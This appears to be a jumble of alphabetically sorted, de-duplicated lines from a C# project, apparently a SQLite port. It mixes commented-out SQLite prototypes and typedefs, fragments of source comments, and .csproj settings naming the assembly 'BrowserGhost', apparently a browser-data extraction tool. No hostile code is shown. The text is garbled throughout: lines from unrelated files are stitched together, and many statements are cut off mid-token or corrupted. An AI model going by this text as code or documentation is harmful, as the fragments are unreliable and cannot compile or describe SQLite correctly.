    //int sqlite3MemCompare(const Mem
    //int sqlite3MemJournalSize(void)
    //int sqlite3MemoryAlarm(void (
    //int sqlite3OpenTableAndIndices(Parse
    //int sqlite3OpenTempDatabase(Parse 
    //int sqlite3OsAccess(sqlite3_vfs 
    //int sqlite3OsCheckReservedLock(sqlite3_file 
    //int sqlite3OsClose(sqlite3_file
    //int sqlite3OsCloseFree(sqlite3_file 
    //int sqlite3OsCurrentTime(sqlite3_vfs 
    //int sqlite3OsDelete(sqlite3_vfs 
    //int sqlite3OsDeviceCharacteristics(sqlite3_file 
    //int sqlite3OsFileControl(sqlite3_file
    //int sqlite3OsFileSize(sqlite3_file
    //int sqlite3OsFullPathname(sqlite3_vfs 
    //int sqlite3OsLock(sqlite3_file
    //int sqlite3OsOpen(sqlite3_vfs 
    //int sqlite3OsOpenMalloc(sqlite3_vfs 
    //int sqlite3OsRandomness(sqlite3_vfs 
    //int sqlite3OsRead(sqlite3_file
    //int sqlite3OsSectorSize(sqlite3_file 
    //int sqlite3OsSleep(sqlite3_vfs 
    //int sqlite3OsSync(sqlite3_file
    //int sqlite3OsTruncate(sqlite3_file
    //int sqlite3OsUnlock(sqlite3_file
    //int sqlite3OsWrite(sqlite3_file
    //int sqlite3PagerAcquire(Pager 
    //int sqlite3PagerBegin(Pager
    //int sqlite3PagerClose(Pager 
    //int sqlite3PagerCommitPhaseOne(Pager
    //int sqlite3PagerCommitPhaseTwo(Pager
    //int sqlite3PagerIsMemdb(Pager
    //int sqlite3PagerJournalMode(Pager 
    //int sqlite3PagerLockingMode(Pager 
    //int sqlite3PagerMaxPageCount(Pager
    //int sqlite3PagerMovepage(Pager
    //int sqlite3PagerNosync(Pager
    //int sqlite3PagerOpen(
    //int sqlite3PagerOpenSavepoint(Pager 
    //int sqlite3PagerPageRefcount(DbPage
    //int sqlite3PagerPagecount(Pager
    //int sqlite3PagerReadFileheader(Pager
    //int sqlite3PagerRefcount(Pager
    //int sqlite3PagerRollback(Pager
    //int sqlite3PagerSavepoint(Pager 
    //int sqlite3PagerSetPagesize(Pager
    //int sqlite3PagerSharedLock(Pager 
    //int sqlite3PagerSync(Pager 
    //int sqlite3PagerWrite(DbPage
    //int sqlite3PcacheFetch(PCache
    //int sqlite3PcacheGetCachesize(PCache 
    //int sqlite3PcacheInitialize(void)
    //int sqlite3PcachePageRefcount(PgHdr
    //int sqlite3PcachePagecount(PCache
    //int sqlite3PcacheRefCount(PCache
    //int sqlite3PcacheSize(void)
    //int sqlite3PutVarint(unsigned char
    //int sqlite3ReadSchema(Parse pParse)
    //int sqlite3Reprepare(Vdbe
    //int sqlite3ResolveExprNames(NameContext
    //int sqlite3ResolveOrderGroupBy(Parse
    //int sqlite3RowSetNext(RowSet
    //int sqlite3RowSetTest(RowSet
    //int sqlite3RunParser(Parse
    //int sqlite3RunVacuum(char
    //int sqlite3SafetyCheckOk(sqlite3
    //int sqlite3SafetyCheckSickOrOk(sqlite3
    //int sqlite3Select(Parse
    //int sqlite3StatusValue(int)
    //int sqlite3StrICmp(const char 
    //int sqlite3Strlen30(const char
    //int sqlite3TempInMemory(const sqlite3
    //int sqlite3TransferBindings(sqlite3_stmt 
    //int sqlite3TwoPartName(Parse 
    //int sqlite3Utf8Read(const u8
    //int sqlite3Utf8To8(unsigned char 
    //int sqlite3ValueBytes(sqlite3_value
    //int sqlite3ValueFromExpr(sqlite3 
    //int sqlite3VarintLen(u64 v)
    //int sqlite3VdbeAddOp0(Vdbe
    //int sqlite3VdbeAddOp1(Vdbe
    //int sqlite3VdbeAddOp2(Vdbe
    //int sqlite3VdbeAddOp3(Vdbe
    //int sqlite3VdbeAddOp4(Vdbe
    //int sqlite3VdbeAddOpList(Vdbe
    //int sqlite3VdbeChangeEncoding(Mem 
    //int sqlite3VdbeCloseStatement(Vdbe 
    //int sqlite3VdbeCurrentAddr(Vdbe
    //int sqlite3VdbeCursorMoveto(VdbeCursor
    //int sqlite3VdbeExec(Vdbe
    //int sqlite3VdbeFinalize(Vdbe
    //int sqlite3VdbeHalt(Vdbe
    //int sqlite3VdbeIdxKeyCompare(VdbeCursor
    //int sqlite3VdbeIdxRowid(sqlite3 
    //int sqlite3VdbeList(Vdbe
    //int sqlite3VdbeMakeLabel(Vdbe
    //int sqlite3VdbeMemCopy(Mem
    //int sqlite3VdbeMemFinalize(Mem
    //int sqlite3VdbeMemFromBtree(BtCursor
    //int sqlite3VdbeMemHandleBom(Mem pMem)
    //int sqlite3VdbeMemIntegerify(Mem
    //int sqlite3VdbeMemMakeWriteable(Mem
    //int sqlite3VdbeMemNulTerminate(Mem
    //int sqlite3VdbeMemNumerify(Mem
    //int sqlite3VdbeMemRealify(Mem
    //int sqlite3VdbeMemSetStr(Mem
    //int sqlite3VdbeMemStringify(Mem
    //int sqlite3VdbeMemTooBig(Mem
    //int sqlite3VdbeMemTranslate(Mem
    //int sqlite3VdbeReleaseBuffers(Vdbe p)
    //int sqlite3VdbeReset(Vdbe
    //int sqlite3VdbeSetColName(Vdbe
    //int sqlite3VtabBegin(sqlite3 
    //int sqlite3VtabCallConnect(Parse
    //int sqlite3VtabCallCreate(sqlite3
    //int sqlite3VtabCallDestroy(sqlite3
    //int sqlite3WalkExpr(Walker
    //int sqlite3WalkExprList(Walker
    //int sqlite3WalkSelect(Walker
    //int sqlite3WalkSelectExpr(Walker
    //int sqlite3WalkSelectFrom(Walker
    //int sqlite3_open_file_count = 0
    //private static extern bool QueryPerformanceCounter( out long lpPerformanceCount )
    //public class _SYSTEMTIME
    //ref int pnByte          /
    //sqlite3 
    //sqlite3UpperToLower[
    //sqlite3_backup 
    //sqlite3_file 
    //sqlite3_int64 sqlite3BtreeGetCachedRowid(BtCursor
    //sqlite3_module
    //sqlite3_stmt 
    //sqlite3_value 
    //static Bitmask exprListTableUsage(WhereMaskSet
    //static Bitmask exprSelectTableUsage(WhereMaskSet
    //static WCHAR 
    //static char 
    //static int allocateBtreePage(BtShared 
    //static int copyPayload(
    //static int getSectorSize(
    //static int multiSelectOrderBy(
    //static int sqlite3_diskfull = 0
    //static int sqlite3_diskfull_pending = 0
    //static int sqlite3_io_error_hardhit = 0
    //static int sqlite3_io_error_hit = 0
    //static int sqlite3_io_error_pending = 0
    //static int sqlite3_io_error_persist = 0
    //static int sqlite3_like_count = 0
    //static int sqlite3_opentemp_count = 0
    //static int sqlite3_pager_readdb_count = 0
    //static int sqlite3_pager_writedb_count = 0
    //static int sqlite3_pager_writej_count = 0
    //static int sqlite3_xferopt_count = 0
    //static int xferOptimization(
    //static void
    //static void 
    //static void allocSpace(
    //static void bestIndex(
    //static void exprAnalyze(SrcList
    //static void releasePage(MemPage pPage)
    //static void sqlite3MemFree(void pPrior){
    //static void substExprList(sqlite3
    //static void substSelect(sqlite3
    //static void whereClauseClear(WhereClause)
    //static void yy_accept(yyParser
    //struct Pager 
    //struct Savepoint {
    //struct sqlite3_api_routines {
    //struct sqlite3_file {
    //struct sqlite3_index_info {
    //struct sqlite3_io_methods {
    //struct sqlite3_mem_methods {
    //struct sqlite3_module {
    //struct sqlite3_mutex_methods {
    //struct sqlite3_pcache_methods {
    //struct sqlite3_vfs {
    //struct sqlite3_vtab {
    //struct sqlite3_vtab_cursor {
    //typedef INT16_TYPE i16
    //typedef INT8_TYPE i8
    //typedef int (
    //typedef sqlite_int64 i64
    //typedef sqlite_int64 sqlite3_int64
    //typedef sqlite_u3264 u64
    //typedef sqlite_uint64 sqlite3_uint64
    //typedef struct AggInfo AggInfo
    //typedef struct AuthContext AuthContext
    //typedef struct AutoincInfo AutoincInfo
    //typedef struct BenignMallocHooks BenignMallocHooks
    //typedef struct Bitvec Bitvec
    //typedef struct BtCursor BtCursor
    //typedef struct BtLock BtLock
    //typedef struct BtShared BtShared
    //typedef struct Btree Btree
    //typedef struct BtreeMutexArray BtreeMutexArray
    //typedef struct BusyHandler BusyHandler
    //typedef struct CellInfo CellInfo
    //typedef struct CollSeq CollSeq
    //typedef struct Column Column
    //typedef struct Context Context
    //typedef struct CountCtx CountCtx
    //typedef struct DateTime DateTime
    //typedef struct Db Db
    //typedef struct DbFixer DbFixer
    //typedef struct Expr Expr
    //typedef struct ExprList ExprList
    //typedef struct ExprSpan ExprSpan
    //typedef struct FKey FKey
    //typedef struct FileChunk FileChunk
    //typedef struct FilePoint FilePoint
    //typedef struct FuncDef FuncDef
    //typedef struct Hash Hash
    //typedef struct HashElem HashElem
    //typedef struct IdList IdList
    //typedef struct Index Index
    //typedef struct IntegrityCk IntegrityCk
    //typedef struct KeyClass KeyClass
    //typedef struct KeyInfo KeyInfo
    //typedef struct Lookaside Lookaside
    //typedef struct LookasideSlot LookasideSlot
    //typedef struct Mem Mem
    //typedef struct Mem sqlite3_value
    //typedef struct MemJournal MemJournal
    //typedef struct MemPage MemPage
    //typedef struct Module Module
    //typedef struct NameContext NameContext
    //typedef struct PCache PCache
    //typedef struct PCache1 PCache1
    //typedef struct Pager Pager
    //typedef struct PagerSavepoint PagerSavepoint
    //typedef struct Parse Parse
    //typedef struct PgFreeslot PgFreeslot
    //typedef struct PgHdr DbPage
    //typedef struct PgHdr PgHdr
    //typedef struct PgHdr1 PgHdr1
    //typedef struct RowSet RowSet
    //typedef struct Savepoint Savepoint
    //typedef struct Schema Schema
    //typedef struct Select Select
    //typedef struct SelectDest SelectDest
    //typedef struct Set Set
    //typedef struct SrcList SrcList
    //typedef struct StrAccum StrAccum
    //typedef struct SumCtx SumCtx
    //typedef struct Table Table
    //typedef struct TableLock TableLock
    //typedef struct Token Token
    //typedef struct Trigger Trigger
    //typedef struct TriggerStack TriggerStack
    //typedef struct TriggerStep TriggerStep
    //typedef struct UnpackedRecord UnpackedRecord
    //typedef struct VTable VTable
    //typedef struct Vdbe Vdbe
    //typedef struct VdbeCursor VdbeCursor
    //typedef struct VdbeFunc VdbeFunc
    //typedef struct VdbeOp Op
    //typedef struct VdbeOp VdbeOp
    //typedef struct VdbeOpList VdbeOpList
    //typedef struct Walker Walker
    //typedef struct WhereAndInfo WhereAndInfo
    //typedef struct WhereClause WhereClause
    //typedef struct WhereCost WhereCost
    //typedef struct WhereInfo WhereInfo
    //typedef struct WhereLevel WhereLevel
    //typedef struct WhereMaskSet WhereMaskSet
    //typedef struct WhereOrInfo WhereOrInfo
    //typedef struct WherePlan WherePlan
    //typedef struct WhereTerm WhereTerm
    //typedef struct analysisInfo analysisInfo
    //typedef struct sqlite3 sqlite3
    //typedef struct sqlite3AutoExtList sqlite3AutoExtList
    //typedef struct sqlite3StatType sqlite3StatType
    //typedef struct sqlite3_api_routines sqlite3_api_routines
    //typedef struct sqlite3_backup sqlite3_backup
    //typedef struct sqlite3_blob sqlite3_blob
    //typedef struct sqlite3_context sqlite3_context
    //typedef struct sqlite3_file sqlite3_file
    //typedef struct sqlite3_index_info sqlite3_index_info
    //typedef struct sqlite3_io_methods sqlite3_io_methods
    //typedef struct sqlite3_mem_methods sqlite3_mem_methods
    //typedef struct sqlite3_module sqlite3_module
    //typedef struct sqlite3_mutex sqlite3_mutex
    //typedef struct sqlite3_mutex_methods sqlite3_mutex_methods
    //typedef struct sqlite3_pcache sqlite3_pcache
    //typedef struct sqlite3_pcache_methods sqlite3_pcache_methods
    //typedef struct sqlite3_stmt sqlite3_stmt
    //typedef struct sqlite3_vfs sqlite3_vfs
    //typedef struct sqlite3_vtab sqlite3_vtab
    //typedef struct sqlite3_vtab_cursor sqlite3_vtab_cursor
    //typedef struct yyParser yyParser
    //typedef struct yyStackEntry yyStackEntry
    //typedef u32 Pgno
    //typedef u3216_TYPE u16
    //typedef u328_TYPE u8
    //typedef u32_TYPE u32
    //typedef u64 Bitmask
    //typedef unsigned char Bool
    //typedef unsigned char etByte
    //typedef void (
    //u32 sqlite3BitvecSize(Bitvec
    //u32 sqlite3Get4byte(const u8
    //u32 sqlite3VdbeSerialGet(const unsigned char
    //u32 sqlite3VdbeSerialType(Mem
    //u32 sqlite3VdbeSerialTypeLen(u32)
    //u32sqlite3VdbeSerialPut(unsigned char
    //u8 sqlite3GetVarint(const unsigned char 
    //u8 sqlite3GetVarint32(const unsigned char 
    //u8 sqlite3PagerIsreadonly(Pager
    //using BITVEC_TELEM     = System.Byte
    //void 
    //void (
    //void //sqlite3DbFree(sqlite3
    //void //sqlite3ScratchFree(void
    //void sqlite3AddCheckConstraint(Parse
    //void sqlite3AddCollateType(Parse
    //void sqlite3AddColumn(Parse
    //void sqlite3AddColumnType(Parse
    //void sqlite3AddDefaultValue(Parse
    //void sqlite3AddNotNull(Parse
    //void sqlite3AddPrimaryKey(Parse
    //void sqlite3AlterBeginAddColumn(Parse 
    //void sqlite3AlterFinishAddColumn(Parse 
    //void sqlite3AlterFunctions(sqlite3
    //void sqlite3AlterRenameTable(Parse
    //void sqlite3Analyze(Parse
    //void sqlite3Attach(Parse
    //void sqlite3AutoLoadExtensions(sqlite3
    //void sqlite3BackupRestart(sqlite3_backup 
    //void sqlite3BackupUpdate(sqlite3_backup 
    //void sqlite3BeginBenignMalloc(void)
    //void sqlite3BeginParse(Parse
    //void sqlite3BeginTransaction(Parse
    //void sqlite3BeginTrigger(Parse
    //void sqlite3BeginWriteOperation(Parse
    //void sqlite3BenignMallocHooks(void (
    //void sqlite3BitvecClear(Bitvec
    //void sqlite3BitvecDestroy(Bitvec
    //void sqlite3BtreeCacheOverflow(BtCursor )
    //void sqlite3BtreeClearCursor(BtCursor 
    //void sqlite3BtreeCursorList(Btree
    //void sqlite3BtreeGetMeta(Btree 
    //void sqlite3BtreeSetCachedRowid(BtCursor
    //void sqlite3BtreeTripAllCursors(Btree
    //void sqlite3ChangeCookie(Parse
    //void sqlite3CloseExtensions(sqlite3
    //void sqlite3CloseSavepoints(sqlite3 
    //void sqlite3CodeSubselect(Parse 
    //void sqlite3CodeVerifySchema(Parse
    //void sqlite3ColumnDefault(Vdbe 
    //void sqlite3CommitInternalChanges(sqlite3
    //void sqlite3CommitTransaction(Parse
    //void sqlite3CompleteInsertion(Parse
    //void sqlite3CreateForeignKey(Parse
    //void sqlite3CreateIndex(Parse
    //void sqlite3CreateView(Parse
    //void sqlite3DefaultRowEst(Index
    //void sqlite3DeferForeignKey(Parse
    //void sqlite3DeleteFrom(Parse
    //void sqlite3DeleteTable(Table
    //void sqlite3DeleteTrigger(sqlite3
    //void sqlite3DeleteTriggerStep(sqlite3
    //void sqlite3Detach(Parse
    //void sqlite3DropIndex(Parse
    //void sqlite3DropTable(Parse
    //void sqlite3DropTrigger(Parse
    //void sqlite3EndBenignMalloc(void)
    //void sqlite3EndTable(Parse
    //void sqlite3Error(sqlite3
    //void sqlite3ErrorClear(Parse
    //void sqlite3ErrorMsg(Parse
    //void sqlite3ExpirePreparedStatements(sqlite3
    //void sqlite3ExprAnalyzeAggList(NameContext
    //void sqlite3ExprAnalyzeAggregates(NameContext
    //void sqlite3ExprAssignVarNumber(Parse
    //void sqlite3ExprAttachSubtrees(sqlite3
    //void sqlite3ExprCacheAffinityChange(Parse
    //void sqlite3ExprCacheClear(Parse
    //void sqlite3ExprCachePop(Parse
    //void sqlite3ExprCachePush(Parse
    //void sqlite3ExprCacheRemove(Parse
    //void sqlite3ExprCacheStore(Parse
    //void sqlite3ExprClear(sqlite3
    //void sqlite3ExprCodeConstants(Parse
    //void sqlite3ExprCodeCopy(Parse
    //void sqlite3ExprCodeMove(Parse
    //void sqlite3ExprDelete(sqlite3
    //void sqlite3ExprHardCopy(Parse
    //void sqlite3ExprIfFalse(Parse
    //void sqlite3ExprIfTrue(Parse
    //void sqlite3ExprListCheckLength(Parse
    //void sqlite3ExprListDelete(sqlite3
    //void sqlite3ExprListSetName(Parse
    //void sqlite3ExprListSetSpan(Parse
    //void sqlite3FinishCoding(Parse
    //void sqlite3FinishTrigger(Parse
    //void sqlite3FuncDefInsert(FuncDefHash
    //void sqlite3GenerateConstraintChecks(Parse
    //void sqlite3GenerateRowDelete(Parse
    //void sqlite3GenerateRowIndexDelete(Parse
    //void sqlite3HashClear(Hash
    //void sqlite3HashInit(Hash
    //void sqlite3IdListDelete(sqlite3
    //void sqlite3IndexAffinityStr(Vdbe 
    //void sqlite3Insert(Parse
    //void sqlite3InvalidFunction(sqlite3_context
    //void sqlite3MallocEnd(void)
    //void sqlite3MaterializeView(Parse
    //void sqlite3MemJournalOpen(sqlite3_file 
    //void sqlite3MemSetDefault(void)
    //void sqlite3MinimumFileFormat(Parse
    //void sqlite3NestedParse(Parse
    //void sqlite3OpenMasterTable(Parse 
    //void sqlite3OpenTable(Parse
    //void sqlite3OsDlClose(sqlite3_vfs 
    //void sqlite3OsDlError(sqlite3_vfs 
    //void sqlite3PCacheBufferSetup(void 
    //void sqlite3PCacheSetDefault(void)
    //void sqlite3PageFree(void
    //void sqlite3PagerDontWrite(DbPage
    //void sqlite3PagerRef(DbPage
    //void sqlite3PagerSetBusyhandler(Pager
    //void sqlite3PagerSetCachesize(Pager
    //void sqlite3PagerSetSafetyLevel(Pager
    //void sqlite3PagerTruncateImage(Pager
    //void sqlite3PagerUnref(DbPage
    //void sqlite3Parser(void
    //void sqlite3ParserFree(void
    //void sqlite3PcacheCleanAll(PCache
    //void sqlite3PcacheClear(PCache
    //void sqlite3PcacheClearSyncFlags(PCache 
    //void sqlite3PcacheClose(PCache
    //void sqlite3PcacheDrop(PgHdr
    //void sqlite3PcacheMakeClean(PgHdr
    //void sqlite3PcacheMakeDirty(PgHdr
    //void sqlite3PcacheMove(PgHdr
    //void sqlite3PcacheOpen(
    //void sqlite3PcacheRef(PgHdr
    //void sqlite3PcacheRelease(PgHdr
    //void sqlite3PcacheSetCachesize(PCache 
    //void sqlite3PcacheSetPageSize(PCache 
    //void sqlite3PcacheShutdown(void)
    //void sqlite3PcacheStats(int
    //void sqlite3PcacheTruncate(PCache
    //void sqlite3Pragma(Parse
    //void sqlite3PrngResetState(void)
    //void sqlite3PrngRestoreState(void)
    //void sqlite3PrngSaveState(void)
    //void sqlite3RegisterBuiltinFunctions(sqlite3
    //void sqlite3RegisterDateTimeFunctions(void)
    //void sqlite3RegisterGlobalFunctions(void)
    //void sqlite3RegisterLikeFunctions(sqlite3
    //void sqlite3Reindex(Parse
    //void sqlite3ReleaseTempRange(Parse
    //void sqlite3ReleaseTempReg(Parse
    //void sqlite3ResetInternalSchema(sqlite3
    //void sqlite3ResolveSelectNames(Parse
    //void sqlite3RollbackAll(sqlite3
    //void sqlite3RollbackTransaction(Parse
    //void sqlite3RootPageMoved(Db
    //void sqlite3RowSetClear(RowSet
    //void sqlite3RowSetInsert(RowSet
    //void sqlite3Savepoint(Parse
    //void sqlite3SchemaFree(void 
    //void sqlite3SelectDelete(sqlite3
    //void sqlite3SelectDestInit(SelectDest
    //void sqlite3SelectPrep(Parse
    //void sqlite3SetString(char 
    //void sqlite3SrcListAssignCursors(Parse
    //void sqlite3SrcListDelete(sqlite3
    //void sqlite3SrcListIndexedBy(Parse 
    //void sqlite3SrcListShiftJoinType(SrcList
    //void sqlite3StartTable(Parse
    //void sqlite3StrAccumAppend(StrAccum
    //void sqlite3StrAccumReset(StrAccum
    //void sqlite3TableAffinityStr(Vdbe 
    //void sqlite3UnlinkAndDeleteIndex(sqlite3
    //void sqlite3UnlinkAndDeleteTable(sqlite3
    //void sqlite3UnlinkAndDeleteTrigger(sqlite3
    //void sqlite3Update(Parse
    //void sqlite3VXPrintf(StrAccum
    //void sqlite3Vacuum(Parse
    //void sqlite3ValueApplyAffinity(sqlite3_value 
    //void sqlite3ValueFree(sqlite3_value
    //void sqlite3ValueSetStr(sqlite3_value
    //void sqlite3VdbeChangeP1(Vdbe
    //void sqlite3VdbeChangeP2(Vdbe
    //void sqlite3VdbeChangeP3(Vdbe
    //void sqlite3VdbeChangeP4(Vdbe
    //void sqlite3VdbeChangeP5(Vdbe
    //void sqlite3VdbeChangeToNoop(Vdbe
    //void sqlite3VdbeComment(Vdbe
    //void sqlite3VdbeCountChanges(Vdbe
    //void sqlite3VdbeDelete(Vdbe
    //void sqlite3VdbeDeleteAuxData(VdbeFunc
    //void sqlite3VdbeDeleteUnpackedRecord(UnpackedRecord
    //void sqlite3VdbeFreeCursor(Vdbe 
    //void sqlite3VdbeIntegerAffinity(Mem
    //void sqlite3VdbeJumpHere(Vdbe
    //void sqlite3VdbeMakeReady(Vdbe
    //void sqlite3VdbeMemMove(Mem
    //void sqlite3VdbeMemRelease(Mem p)
    //void sqlite3VdbeMemReleaseExternal(Mem p)
    //void sqlite3VdbeMemSetDouble(Mem
    //void sqlite3VdbeMemSetInt64(Mem
    //void sqlite3VdbeMemSetNull(Mem
    //void sqlite3VdbeMemSetRowSet(Mem
    //void sqlite3VdbeMemSetZeroBlob(Mem
    //void sqlite3VdbeMemShallowCopy(Mem
    //void sqlite3VdbeNoopComment(Vdbe
    //void sqlite3VdbePrintOp(FILE
    //void sqlite3VdbeResetStepResult(Vdbe
    //void sqlite3VdbeResolveLabel(Vdbe
    //void sqlite3VdbeSetChanges(sqlite3 
    //void sqlite3VdbeSetNumCols(Vdbe
    //void sqlite3VdbeSetSql(Vdbe
    //void sqlite3VdbeSwap(Vdbe
    //void sqlite3VdbeUsesBtree(Vdbe
    //void sqlite3VtabArgExtend(Parse
    //void sqlite3VtabArgInit(Parse
    //void sqlite3VtabBeginParse(Parse
    //void sqlite3VtabFinishParse(Parse
    //void sqlite3VtabMakeWritable(Parse
    //void sqlite3WhereEnd(WhereInfo
    //void sqlite3sqlite3Put4byte(u8
    //void sqliteVdbePopStack(Vdbe
    //void sqliteViewTriggers(Parse
    //{
    //}
    //}  /
    0                          /
    0          Halt and return the number of errors
    0      The column name as it should be displayed for output
    0x00                      becomes  0x00000000
    0x7f                      becomes  0x0000007f
    0x80 0x7f                 becomes  0x0000007f
    0x81 0x00                 becomes  0x00000080
    0x81 0x81 0x81 0x81 0x01  becomes  0x10204081
    0x82 0x00                 becomes  0x00000100
    0x8a 0x91 0xd1 0xac 0x78  becomes  0x12345678
    1      The datatype name for the column
    1 N S X    Set N bits beginning with S and incrementing by X
    1.  The rowid of the row to be updated before the update.  This
    10 
    2      The name of the database that the column derives from
    2 N S X    Clear N bits beginning with S and incrementing by X
    2.  The rowid of the row after the update.
    20 
    3      The name of the table that the column derives from
    3 N        Set N randomly chosen bits
    3.  The data in the first column of the entry after the update.
    30 
    4      The name of the table column that the result column derives from
    4 N        Clear N randomly chosen bits
    40 
    50 
    60 
    70 
    80 
    90 
    </BootstrapperPackage>
    </FileUpgradeFlags>
    </TargetFrameworkProfile>
    </UpgradeBackupLocation>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
    <AssemblyName>BrowserGhost</AssemblyName>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <DebugType>pdbonly</DebugType>
    <DefineConstants>TRUE WIN32 _MSC_VER NDEBUG NO_TCL SQLITE_ASCII SQLITE_DISABLE_LFS SQLITE_ENABLE_OVERSIZE_CELL_CHECK SQLITE_MUTEX_OMIT SQLITE_OMIT_AUTHORIZATION SQLITE_OMIT_DEPRECATED SQLITE_OMIT_GET_TABLE SQLITE_OMIT_INCRBLOB SQLITE_OMIT_LOOKASIDE SQLITE_OMIT_SHARED_CACHE SQLITE_OMIT_UTF16 SQLITE_OMIT_VIRTUALTABLE SQLITE_OS_WIN SQLITE_SYSTEM_MALLOC VDBE_PROFILE_OFF </DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <FileUpgradeFlags>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <MapFileExtensions>true</MapFileExtensions>
    <NoWarn>0168 
    <OldToolsVersion>3.5</OldToolsVersion>
    <Optimize>false</Optimize>
    <Optimize>true</Optimize>
    <OutputPath>bin
    <OutputType>Exe</OutputType>
    <PlatformTarget>AnyCPU</PlatformTarget>
    <PlatformTarget>x86</PlatformTarget>
    <ProductVersion>9.0.30729</ProductVersion>
    <ProjectGuid>{F1653F20-D47D-4F29-8C55-3C835542AF5F}</ProjectGuid>
    <PublishUrl>publish
    <RootNamespace>BrowserGhost</RootNamespace>
    <SchemaVersion>2.0</SchemaVersion>
    <StartupObject />
    <TargetFrameworkProfile>
    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdateMode>Foreground</UpdateMode>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <UpgradeBackupLocation>
    <UseApplicationTrust>false</UseApplicationTrust>
    <WarningLevel>4</WarningLevel>
    ANALYZE => ID 
    AeqB:    Called when there is data from both coroutines and A==B.
    AeqB: ...
    AgtB:    Called when there is data from both coroutines and A>B.
    AgtB: ...
    AltB:    Called when there is data from both coroutines and A<B.
    AltB: ...
    Bitmask notReady      /
    Bitvec pDone                 /
    BtCursor pCur                              /
    BtCursor pCur                         /
    CASCADE => ID 
    CREATE
    Code generated
    Convert pRec to a text representation.
    DESTROY
    DbPage pDbPage             /
    Debug.Assert( pgno <= PAGER_MAX_PGNO 
    Debug.Assert( zRec!=0 
    EXPLAIN => ID 
    EofA:    Called when data is exhausted from selectA.
    EofA: ...
    EofB:    Called when data is exhausted from selectB.
    EofB: ...
    Expr pCheckExpr  /
    Expr pE           /
    Expr pExpr             /
    Expr pExpr          /
    Expr pExpr        /
    Expr pKey           /
    Expr pOffset         /
    Expr pRight
    Expr pWhere            /
    Expr.iColumn   The column index in X.Y.  -1 for the rowid.
    Expr.iTable    The VDBE cursor number for X.Y
    Expr.op        Changed to TK_COLUMN
    Expr.pTab      Points to the Table object for X.Y
    ExprList pEList     /
    ExprList pEList    /
    ExprList pList    /
    ExprSpan pRight    /
    ExprSpan pSpan         /
    FULL      The journal is synced twice before writes begin on the
    FuncDef pDef        /
    HashElem pNew         /
    INDEXED => nothing 
    INSERT
    INSTEAD => ID 
    IdList pUsing          /
    Index pIdx           /
    Init: initialize coroutine registers
    LIKE_KW => ID 
    May you do good and not evil.
    May you find forgiveness for yourself and forgive others.
    Mem pMem                     /
    Mem pMem            /
    Mem pMem          /
    Module 
    N.  The data in the last column of the entry after the update.
    N>=12 and even       (N-12)/2        BLOB
    N>=13 and odd        (N-13)/2        text
    NORMAL    The journal is synced once before writes begin on the
    NameContext pOuterNC  /
    No-op.  pRec is unchanged.
    OFF       sqlite3OsSync() is never called.  This is the default
    PAGER_INCR( ref pPager.nHit )
    PAGER_INCR( ref pPager.nMiss )
    PAGER_JOURNALMODE_DELETE
    PAGER_JOURNALMODE_MEMORY
    PAGER_JOURNALMODE_OFF
    PAGER_JOURNALMODE_PERSIST
    PAGER_JOURNALMODE_QUERY
    PAGER_JOURNALMODE_TRUNCATE
    PCache p                     /
    PENDING -> EXCLUSIVE
    REINDEX => ID 
    RELEASE => ID 
    REPLACE => ID 
    RESERVED -> (PENDING) -> EXCLUSIVE
    RowSetEntry pB     /
    SELECT 
    SHARED -> (PENDING) -> EXCLUSIVE
    SHARED -> RESERVED
    SIZE    DESCRIPTION
    SMALLEST
    Schema 
    Select pSelect         /
    Select pSelect        /
    Select pSelect       /
    Select pSelect      /
    SelectDest pDest          /
    SelectDest pDest      /
    SelectDest pDest  /
    SrcList pList       /
    StringBuilder zFull           /
    StringBuilder zPathOut
    TEST
    TRIGGER => ID 
    Table 
    Table pTab         /
    Token pAll             /
    Token pDatabase    /
    Token pName                /
    Token pName               /
    Token pName         /
    Token pPostOp         /
    Token pPreOp          /
    Token pToken     /
    TriggerStack 
    TriggerStep pStep   /
    TriggerStep pStep /
    Try to convert pRec to an integer representation or a
    UNLOCKED -> SHARED
    UnpackedRecord pPKey2       /
    VIRTUAL => ID 
    VTable 
    Vdbe 
    Vdbe p                         /
    Vdbe p                   /
    WRC_Abort         Do no more callbacks.  Unwind the stack and
    WRC_Continue      Continue descending down the tree.
    WRC_Prune         Do not descend into child nodes.  But allow
    WhereClause pWC         /
    WhereCost pCost             /
    WhereMaskSet pMaskSet   /
    YYACTIONTYPE       is the data type used for storing terminal
    YYCODETYPE         is the data type used for storing terminal
    YYCODETYPE iLookAhead     /
    YYERRORSYMBOL      is the code number of the error symbol.  If not
    YYMINORTYPE        is the data type used for all minor tokens.
    YYMINORTYPE yyminor            /
    YYMINORTYPE yypMinor         /
    YYMINORTYPE yypminor   /
    YYMINORTYPE yyzerominor = new YYMINORTYPE()
    YYNOCODE           is a number of type YYCODETYPE which corresponds
    YYNRULE            the number of rules in the grammar
    YYNSTATE           the combined number of states.
    YYSTACKDEPTH       is the maximum depth of the parser's stack.  If
    a row containing values to be substituted for new.
    a row containing values to be substituted for old.
    a temporary vdbe cursor (index newIdx) must be open and pointing at
    a temporary vdbe cursor (index oldIdx) must be open and pointing at
    an integer representation is more space efficient on disk.
    assert( db2 )
    assert( rc==SQLITE_OK )
    assert(pArg->z < p->z)
    azModuleArg[i
    azModuleArg[i] = zArg
    balance_cleanup:
    bool allowAffChng /
    bool doHardCopy   /
    bool doMakeRec    /
    bool isOuterJoin      /
    bool isRowid           /
    bool noSync           /
    bool skipKey    /
    bool subqueryIsAgg   /
    bool useSeekResult  /
    btree_open_out:
    byte[] sqlite3ScratchMalloc( int n )
    can be indices of cursors in temporary tables.  See below.)
    char 
    class AesGcm
    class EncName
    class Keyword
    class Program
    cleardatabasepage_out:
    const bool SQLITE_OS_OS2 = false
    const bool SQLITE_OS_UNIX = false
    const bool SQLITE_OS_WIN = true
    const bool sqlite3one = true
